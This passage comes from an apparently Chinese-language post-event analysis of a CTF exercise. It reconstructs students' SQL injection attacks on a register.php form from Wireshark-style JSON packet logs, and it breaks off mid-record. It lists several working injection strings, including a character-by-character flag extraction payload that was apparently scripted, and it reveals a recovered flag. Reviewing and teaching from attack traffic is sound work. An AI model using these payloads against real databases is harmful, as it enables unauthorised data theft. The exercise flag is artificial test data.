"1937257578", "tcp.options.timestamp.tsecr": "204141199"}}, "Timestamps": {"tcp.time_relative": "0.523306000", "tcp.time_delta": "0.080293000"}, "tcp.analysis": {"tcp.analysis.acks_frame": "4195677", "tcp.analysis.ack_rtt": "0.080293000", "tcp.analysis.initial_rtt": "0.101126000", "tcp.analysis.bytes_in_flight": "594", "tcp.analysis.push_bytes_sent": "594"}, "tcp.payload": "50:4f:53:54:20:2f:72:65:67:69:73:74:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:58:31:31:3b:20:4c:69:6e:75:78:20:78:38:36:5f:36:34:3b:20:72:76:3a:31:30:32:2e:30:29:20:47:65:63:6b:6f:2f:32:30:31:30:30:31:30:31:20:46:69:72:65:66:6f:78:2f:31:30:32:2e:30:0d:0a:41:63:63:65:70:74:3a:20:74:65:78:74:2f:68:74:6d:6c:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:68:74:6d:6c:2b:78:6d:6c:2c:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:6d:6c:3b:71:3d:30:2e:39:2c:69:6d:61:67:65:2f:61:76:69:66:2c:69:6d:61:67:65:2f:77:65:62:70:2c:2a:2f:2a:3b:71:3d:30:2e:38:0d:0a:41:63:63:65:70:74:2d:4c:61:6e:67:75:61:67:65:3a:20:65:6e:2d:55:53:2c:65:6e:3b:71:3d:30:2e:35:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:36:37:0d:0a:4f:72:69:67:69:6e:3a:20:68:74:74:70:3a:2f:2f:31:30:2e:30:2e:30:2e:34:0d:0a:44:4e:54:3a:20:31:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:63:6c:6f:73:65:0d:0a:52:65:66:65:72:65:72:3a:20:68:74:74:70:3a:2f:2f:31:30:2e:30:2e:30:2e:34:2f:72:65:67:69:73:74:65:72:2e:70:68:70:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:6c:68:76:74:6e:71:36:32:35:6f:72:35:31:6a:6f:75:6a:72:72:76:64:38:37:32:65:37:0d:0a:55:70:67:72:61:64:65:2d:49:6e:73:65:63:75:72:65:2d:52:65:71:75:65:73:74:73:3a:20:31:0d:0a:0d:0a:65:6d:61:69:6c:3d:66:75:62:6f:61:74:25:34:30:6f:75:74:6c:6f:6f:6b:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:25:32:37:25:32:42:61:62:61:25:32:42:25:32:37:26:70:61:73:73:77:6f:72:64:3d:31:32:33:34:35:36"}, "http": {"POST /register.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /register.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/register.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Upgrade-Insecure-Requests: 1\r\n", "http.user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "http.accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "http.accept_language": "en-US,en;q=0.5", "http.accept_encoding": "gzip, deflate", "http.content_type": "application/x-www-form-urlencoded", "http.content_length_header": "67", "http.content_length_header_tree": {"http.content_length": "67"}, "http.connection": "close", "http.referer": "http://10.0.0.4/register.php", "http.cookie": "PHPSESSID=lhvtnq625or51joujrrvd872e7", "http.cookie_tree": {"http.cookie_pair": "PHPSESSID=lhvtnq625or51joujrrvd872e7"}, "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/register.php", "http.request": "1", "http.request_number": "1", "http.response_in": "4195680", "http.file_data": "email=fuboat%40outlook.com&username=%27%2Baba%2B%27&password=123456"}, "urlencoded-form": {"Form item: \"email\" = \"fuboat@outlook.com\"": {"urlencoded-form.key": "email", "urlencoded-form.value": "fuboat@outlook.com"}, "Form item: \"username\" = \"'+aba+'\"": {"urlencoded-form.key": "username", "urlencoded-form.value": "'+aba+'"}, "Form item: \"password\" = \"123456\"": {"urlencoded-form.key": "password", "urlencoded-form.value": "123456"}}}}}
```

```
{"_index": "packets-2023-04-23", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 23, 2023 22:23:26.335084000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682259806.335084000", "frame.time_delta": "0.007555000", "frame.time_delta_displayed": "0.007555000", "frame.time_relative": "202580.707887000", "frame.number": "4196760", "frame.len": "1231", "frame.cap_len": "1231", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:data-text-lines"}, "eth": {"eth.dst": "e2:33:ee:ef:45:42", "eth.dst_tree": {"eth.dst_resolved": "e2:33:ee:ef:45:42", "eth.dst.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "6e:46:94:7c:10:9f", "eth.src_tree": {"eth.src_resolved": "6e:46:94:7c:10:9f", "eth.src.oui": "7227028", "eth.addr": "6e:46:94:7c:10:9f", "eth.addr_resolved": "6e:46:94:7c:10:9f", "eth.addr.oui": "7227028", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "1217", "ip.id": "0xd25c", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "64", "ip.proto": "6", "ip.checksum": "0xed6a", "ip.checksum.status": "2", "ip.src": "10.255.96.80", "ip.addr": "99.999.9.12", "ip.src_host": "10.255.96.80", "ip.host": "99.999.9.12", "ip.dst": "99.999.9.12", "ip.dst_host": "99.999.9.12"}, "tcp": {"tcp.srcport": "44869", "tcp.dstport": "8888", "tcp.port": "8888", "tcp.stream": "90022", "tcp.completeness": "31", "tcp.len": "1165", "tcp.seq": "19", "tcp.seq_raw": "669955202", "tcp.nxtseq": "1184", "tcp.ack": "446", "tcp.ack_raw": "3994534001", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "501", "tcp.window_size": "64128", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0x7b23", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:0c:2b:b5:c3:73:78:f7:27", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:0c:2b:b5:c3:73:78:f7:27", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "204191171", "tcp.options.timestamp.tsecr": "1937307431"}}, "Timestamps": {"tcp.time_relative": "0.550695000", "tcp.time_delta": "0.007555000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.101877000", "tcp.analysis.bytes_in_flight": "1165", "tcp.analysis.push_bytes_sent": "1165"}, "tcp.payload": "48:54:54:50:2f:31:2e:31:20:32:30:30:20:4f:4b:0d:0a:44:61:74:65:3a:20:53:75:6e:2c:20:32:33:20:41:70:72:20:32:30:32:33:20:31:34:3a:32:33:3a:32:36:20:47:4d:54:0d:0a:53:65:72:76:65:72:3a:20:41:70:61:63:68:65:2f:32:2e:34:2e:37:20:28:55:62:75:6e:74:75:29:0d:0a:58:2d:50:6f:77:65:72:65:64:2d:42:79:3a:20:50:48:50:2f:35:2e:35:2e:39:2d:31:75:62:75:6e:74:75:34:2e:32:39:0d:0a:45:78:70:69:72:65:73:3a:20:54:68:75:2c:20:31:39:20:4e:6f:76:20:31:39:38:31:20:30:38:3a:35:32:3a:30:30:20:47:4d:54:0d:0a:43:61:63:68:65:2d:43:6f:6e:74:72:6f:6c:3a:20:6e:6f:2d:73:74:6f:72:65:2c:20:6e:6f:2d:63:61:63:68:65:2c:20:6d:75:73:74:2d:72:65:76:61:6c:69:64:61:74:65:2c:20:70:6f:73:74:2d:63:68:65:63:6b:3d:30:2c:20:70:72:65:2d:63:68:65:63:6b:3d:30:0d:0a:50:72:61:67:6d:61:3a:20:6e:6f:2d:63:61:63:68:65:0d:0a:56:61:72:79:3a:20:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:0d:0a:43:6f:6e:74:65:6e:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:37:39:32:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:63:6c:6f:73:65:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:74:65:78:74:2f:68:74:6d:6c:0d:0a:0d:0a:1f:8b:08:00:00:00:00:00:00:03:95:55:cd:72:d3:30:10:be:e7:29:84:18:c6:e9:4c:1c:a7:a5:b4:4c:6a:e7:00:d3:0e:cc:c0:70:68:5f:40:91:36:b6:5a:59:76:25:d9:69:60:b8:71:e0:ca:4c:4f:3c:01:cf:c0:fb:40:5f:03:c9:b2:13:a7:29:0c:bd:24:bb:df:ee:b7:7f:5a:c9:f1:13:56:50:b3:2a:01:65:26:17:b3:41:ec:fe:90:20:32:4d:30:48:3c:1b:20:14:67:40:98:13:ac:98:83:21:88:66:44:69:30:09:ae:cc:22:7c:89:5b:93:e1:46:c0:ec:f7:d7:6f:77:df:bf:fc:fa:79:7b:77:fb:23:8e:3c:d6:a3:66:c6:94:21:5c:57:bc:4e:30:15:40:94:4b:8d:11:2d:a4:01:69:23:16:12:f7:dd:25:c9:21:c1:ef:8b:39:17:f0:a1:34:3c:e7:1f:81:f5:dc:9f:1f:4c:1e:f0:7f:43:24:cb:40:b0:33:c5:41:32:b1:ea:11:2e:54:05:0f:30:48:59:0a:08:f3:26:4f:b8:84:79:68:81:90:92:92:cc:45:bf:ba:15:e8:07:c8:35:87:65:59:28:d3:73:5c:72:66:b2:84:41:cd:a9:8d:e7:94:51:06:3c:cd:4c:87:79:6d:c4:25:37:9c:88:50:53:22:20:d9:1f:4f:46:b9:85:f2:2a:ef:23:e4:e6:1e:52:69:50:8d:ea:ca:4b:64:81:51:d4:56:25:b8:bc:42:0a:44:82:b5:59:09:d0:19:80:2d:2b:53:b0:48:f0:38:da:60:3a:e2:92:c1:cd:98:ea:75:43:ff:4f:5d:08:62:b8:6d:b5:61:ef:a6:0e:36:be:81:e7:07:db:fc:46:76:e4:c0:93:e3:a8:5b:b0:78:5e:b0:d5:6c:e0:03:4a:52:23:ce:12:9c:83:ac:da:22:2d:ca:78:dd:c9:5e:43:54:10:ad:13:cc:f3:34:b4:2a:de:58:b7:ed:cd:d0:ac:13:9e:c5:f6:17:69:45:5d:5f:55:29:0a:c2:74:44:c6:97:25:38:5b:b4:95:c0:86:d0:25:91:5b:31:dc:a1:6f:65:41:68:d2:f3:8f:1c:a1:57:62:3f:60:4f:89:23:db:5f:d7:6a:4e:b8:6c:7a:b5:54:10:9b:66:dd:5c:40:f5:82:79:a0:2b:a7:b4:bf:a1:87:f0:5f:6b:ee:39:85:cd:75:c4:b3:d7:17:67:f7:cb:6c:67:e5:6a:98:13:7a:15:6e:0d:7d:77:98:a9:58:95:59:e8:96:00:75:db:10:3a:de:7d:ca:ce:34:77:80:2e:ab:1b:2d:97:8b:22:5c:2a:52:ea:47:a6:b6:8f:91:e1:32:d5:e1:fe:a3:0a:f0:8b:b7:19:b0:5f:0c:b7:9d:76:eb:c8:8d:bf:b8:d3:fd:c9:e4:d9:89:53:fd:9d:9d:7a:a0:a8:41:2d:44:b1:9c:66:9c:31:90:27:d8:6f:14:cf:49:0a:3a:3a:3a:3e:3c:9c:1c:db:9d:4a:31:22:c2:3e:08:f8:e1:9c:71:e4:8e:be:95:35:55:bc:34:dd:66:5e:92:9a:78:c4:de:18:c1:19:14:95:59:0b:63:fb:4c:8c:2f:b5:db:57:ef:b3:15:a2:cb:55:13:85:3a:06:4a:90:84:25:3a:6f:d5:e1:a7:f5:50:82:66:e9:82:29:b2:1f:82:ca:9e:bb:19:a7:60:4e:05:38:f1:d5:ea:2d:1b:b6:0e:7b:a3:0d:c5:ad:c7:bf:18:8d:bd:4f:28:09:63:f6:84:2c:e7:e0:c5:51:0f:37:85:00:45:24:05:6b:39:9e:b4:f8:e7:bd:93:41:2b:ae:33:5c:57:a0:56:e7:20:80:9a:42:0d:83:a7:eb:2d:0d:f6:c6:36:f6:69:6d:9d:de:71:6d:9f:5f:b0:66:2a:38:bd:0a:46:68:51:49:6a:78:21:87:7b:68:d3:f0:7a:88:a6:48:53:01:43:9b:6d:93:d7:9f:4a:37:c7:e6:75:f2:8f:92:3d:38:f7:81:fc:03:b4:80:62:e7:30:07:00:00"}, "http": {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Sun, 23 Apr 2023 14:23:26 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.cache_control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "http.content_encoding": "gzip", "http.content_length_header": "792", "http.content_length_header_tree": {"http.content_length": "792"}, "http.connection": "close", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "1", "http.time": "0.007606000", "http.request_in": "4196758", "http.response_for.uri": "http://10.0.0.4/index.php", "Content-encoded entity body (gzip): 792 bytes -> 1840 bytes": "", "http.file_data": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <title>������������</title>\n    <meta http-equiv=\"cleartype\" content=\"on\">\n    <meta name=\"MobileOptimized\" content=\"320\">\n    <meta name=\"HandheldFriendly\" content=\"True\">\n    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n    <meta name=\"viewport\" content=\"width=device-width,height=device-height,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\" />\n    <link rel=\"stylesheet\" href=\"./stylesheets/index.css\">\n    <link rel=\"stylesheet\" href=\"./stylesheets/flaticon.css\" />\n    <link rel='stylesheet' href='./stylesheets/style.css' />\n  </head>\n  <body>\n\n    <nav id=\"menu\">\n      <div>\n        <div class=\"img-div\">\n          <div class=\"user-img\"><img src=\"./uploads/a.jpeg\"></div>\n          <span class=\"user-name\">\n            0          </span>\n        </div>\n      </div>\n    </nav>\n\n    <main id=\"panel\">\n      <header>\n        <header class=\"pass-header\">\n          <span class=\"pass-header-title\">CTF</span>\n          <div id=\"back-menu\">\n            <div class=\"glyph-icon flaticon-back\">\n            </div>\n          </div>\n          <div id=\"userinfo-wraps\">\n            <div class=\"glyph-icon flaticon-settings-1\">\n            </div>\n          </div>\n      </header>\n      <img style=\"max-width:100%;max-height::100%;overflow:hidden;\" src=\"images/674407.jpg\" alt=\"\">\n      </header>\n    </main>\n    <script src=\"./javascripts/slideout/slideout.min.js\"></script>\n    <script>\n      var slideout = new Slideout({\n        'panel': document.getElementById('panel'),\n        'menu': document.getElementById('menu'),\n        'padding': 256,\n        'tolerance': 70\n      });\n\n      document.querySelector('#back-menu').addEventListener('click', function() {\n        slideout.toggle();\n      });\n    </script>\n\n  </body>\n</html>"}, "data-text-lines": {"<!doctype html>\\n": "", "<html lang=\"en\">\\n": "", "  <head>\\n": "", "    <meta charset=\"utf-8\">\\n": "", "    <title>我的应用</title>\\n": "", "    <meta http-equiv=\"cleartype\" content=\"on\">\\n": "", "    <meta name=\"MobileOptimized\" content=\"320\">\\n": "", "    <meta name=\"HandheldFriendly\" content=\"True\">\\n": "", "    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\\n": "", "    <meta name=\"viewport\" content=\"width=device-width,height=device-height,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\" />\\n": "", "    <link rel=\"stylesheet\" href=\"./stylesheets/index.css\">\\n": "", "    <link rel=\"stylesheet\" href=\"./stylesheets/flaticon.css\" />\\n": "", "    <link rel='stylesheet' href='./stylesheets/style.css' />\\n": "", "  </head>\\n": "", "  <body>\\n": "", "\\n": "", "    <nav id=\"menu\">\\n": "", "      <div>\\n": "", "        <div class=\"img-div\">\\n": "", "          <div class=\"user-img\"><img src=\"./uploads/a.jpeg\"></div>\\n": "", "          <span class=\"user-name\">\\n": "", "            0          </span>\\n": "", "        </div>\\n": "", "      </div>\\n": "", "    </nav>\\n": "", "    <main id=\"panel\">\\n": "", "      <header>\\n": "", "        <header class=\"pass-header\">\\n": "", "          <span class=\"pass-header-title\">CTF</span>\\n": "", "          <div id=\"back-menu\">\\n": "", "            <div class=\"glyph-icon flaticon-back\">\\n": "", "            </div>\\n": "", "          </div>\\n": "", "          <div id=\"userinfo-wraps\">\\n": "", "            <div class=\"glyph-icon flaticon-settings-1\">\\n": "", "      </header>\\n": "", "      <img style=\"max-width:100%;max-height::100%;overflow:hidden;\" src=\"images/674407.jpg\" alt=\"\">\\n": "", "    </main>\\n": "", "    <script src=\"./javascripts/slideout/slideout.min.js\"></script>\\n": "", "    <script>\\n": "", "      var slideout = new Slideout({\\n": "", "        'panel': document.getElementById('panel'),\\n": "", "        'menu': document.getElementById('menu'),\\n": "", "        'padding': 256,\\n": "", "        'tolerance': 70\\n": "", "      });\\n": "", "      document.querySelector('#back-menu').addEventListener('click', function() {\\n": "", "        slideout.toggle();\\n": "", "    </script>\\n": "", "  </body>\\n": "", "</html>": ""}}}}
```

果不其然，该同学紧接着又进行了数十次类似的攻击尝试，使用了`abc'+'abc'+'abc`、`'||'abc'||'`、`'+'0'+ASCII(SUBSTR((SELECT+*+FROM+FLAG),1,1))+'`、`'+'0'+ASCII(SUBSTRING((SELECT * FROM FLAG)FROM 1 FOR 1))+'`、`'+CAST(ASCII(SUBSTR((SELECT * FROM flag) FROM 1 FOR 1)) AS CHAR)+'`等字符串作为用户名进行SQL注入攻击。有趣的是，有那么几次攻击尝试中，该同学尝试更换了`ASCII`和`SUBSTR`的大小写进行攻击，意义不明。

### 攻击步骤 4-5

（成功动作）从`Apr 23, 2023 23:53:45.585005000 中国标准时间`开始，攻击者使用`0'+ascii(substr((select * from flag) from 1 for 1))+'0`成功拿到了flag第一位的ASCII码。之后在很短时间内，直到`Apr 23, 2023 23:54:57.027632000 中国标准时间`，攻击者一共尝试了45次（即循环至``0'+ascii(substr((select * from flag) from 45 for 1))+'0``），之后就没有攻击记录了，说明该同学已经成功获取了flag。

```
{"_index": "packets-2023-04-23", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 23, 2023 23:53:45.585005000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682265225.585005000", "frame.time_delta": "0.130327000", "frame.time_delta_displayed": "0.130327000", "frame.time_relative": "207999.957808000", "frame.number": "4435621", "frame.len": "404", "frame.cap_len": "404", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form"}, "eth": {"eth.dst": "6e:46:94:7c:10:9f", "eth.dst_tree": {"eth.dst_resolved": "6e:46:94:7c:10:9f", "eth.dst.oui": "7227028", "eth.addr": "6e:46:94:7c:10:9f", "eth.addr_resolved": "6e:46:94:7c:10:9f", "eth.addr.oui": "7227028", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "390", "ip.id": "0x23f1", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0xa111", "ip.checksum.status": "2", "ip.src": "99.999.9.12", "ip.addr": "10.255.96.80", "ip.src_host": "99.999.9.12", "ip.host": "10.255.96.80", "ip.dst": "10.255.96.80", "ip.dst_host": "10.255.96.80"}, "tcp": {"tcp.srcport": "8888", "tcp.dstport": "41417", "tcp.port": "41417", "tcp.stream": "98443", "tcp.completeness": "31", "tcp.len": "338", "tcp.seq": "20", "tcp.seq_raw": "2418384132", "tcp.nxtseq": "358", "tcp.ack": "19", "tcp.ack_raw": "4207943201", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "509", "tcp.window_size": "65152", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0x004b", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:73:cb:a8:20:0c:7e:66:32", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:73:cb:a8:20:0c:7e:66:32", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "1942726688", "tcp.options.timestamp.tsecr": "209610290"}}, "Timestamps": {"tcp.time_relative": "0.519552000", "tcp.time_delta": "0.130327000"}, "tcp.analysis": {"tcp.analysis.acks_frame": "4435620", "tcp.analysis.ack_rtt": "0.130327000", "tcp.analysis.initial_rtt": "0.079077000", "tcp.analysis.bytes_in_flight": "338", "tcp.analysis.push_bytes_sent": "338"}, "tcp.payload": "50:4f:53:54:20:2f:72:65:67:69:73:74:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:70:79:74:68:6f:6e:2d:72:65:71:75:65:73:74:73:2f:32:2e:32:38:2e:31:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:2c:20:62:72:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:31:32:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:0d:0a:65:6d:61:69:6c:3d:31:25:34:30:31:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:61:73:63:69:69:25:32:38:73:75:62:73:74:72:25:32:38:25:32:38:73:65:6c:65:63:74:2b:25:32:41:2b:66:72:6f:6d:2b:66:6c:61:67:25:32:39:2b:66:72:6f:6d:2b:31:2b:66:6f:72:2b:31:25:32:39:25:32:39:25:32:42:25:32:37:30:26:70:61:73:73:77:6f:72:64:3d:31"}, "http": {"POST /register.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /register.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/register.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Content-Type: application/x-www-form-urlencoded\r\n", "http.user_agent": "python-requests/2.28.1", "http.accept_encoding": "gzip, deflate, br", "http.accept": "*/*", "http.connection": "keep-alive", "http.content_length_header": "112", "http.content_length_header_tree": {"http.content_length": "112"}, "http.content_type": "application/x-www-form-urlencoded", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/register.php", "http.request": "1", "http.request_number": "1", "http.response_in": "4435623", "http.next_request_in": "4435627", "http.file_data": "email=1%401.com&username=0%27%2Bascii%28substr%28%28select+%2A+from+flag%29+from+1+for+1%29%29%2B%270&password=1"}, "urlencoded-form": {"Form item: \"email\" = \"1@1.com\"": {"urlencoded-form.key": "email", "urlencoded-form.value": "1@1.com"}, "Form item: \"username\" = \"0'+ascii(substr((select * from flag) from 1 for 1))+'0\"": {"urlencoded-form.key": "username", "urlencoded-form.value": "0'+ascii(substr((select * from flag) from 1 for 1))+'0"}, "Form item: \"password\" = \"1\"": {"urlencoded-form.key": "password", "urlencoded-form.value": "1"}}}}}
```

根据服务器返回的html数据，我们也编写脚本自动解码出了该同学在`Apr 23, 2023 23:53:45.585005000 中国标准时间`时的第四题flag：`7498e38f-35de-4e93-b28a-5c36cfc9241f`。

## 17

### 攻击步骤 4-1

（准备动作）攻击者访问了login.php，但并没有进行登录或攻击操作。

```
{"_index": "packets-2023-04-14", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 14, 2023 20:13:27.977601000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681474407.977601000", "frame.time_delta": "0.000359000", "frame.time_delta_displayed": "0.000359000", "frame.time_relative": "69848.591424000", "frame.number": "707872", "frame.len": "543", "frame.cap_len": "543", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http", "frame.coloring_rule.name": "HTTP", "frame.coloring_rule.string": "http || tcp.port == 80 || http2"}, "eth": {"eth.dst": "b6:40:78:95:09:fb", "eth.dst_tree": {"eth.dst_resolved": "b6:40:78:95:09:fb", "eth.dst.oui": "11944056", "eth.addr": "b6:40:78:95:09:fb", "eth.addr_resolved": "b6:40:78:95:09:fb", "eth.addr.oui": "11944056", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "529", "ip.id": "0x0000", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0xa451", "ip.checksum.status": "2", "ip.src": "99.999.9.17", "ip.addr": "10.255.128.134", "ip.src_host": "99.999.9.17", "ip.host": "10.255.128.134", "ip.dst": "10.255.128.134", "ip.dst_host": "10.255.128.134"}, "tcp": {"tcp.srcport": "7001", "tcp.dstport": "48304", "tcp.port": "48304", "tcp.stream": "27969", "tcp.completeness": "31", "tcp.len": "477", "tcp.seq": "3270760", "tcp.seq_raw": "4231651997", "tcp.nxtseq": "3271237", "tcp.ack": "2768667", "tcp.ack_raw": "3654402104", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "2048", "tcp.window_size": "131072", "tcp.window_size_scalefactor": "64", "tcp.checksum": "0xa846", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": 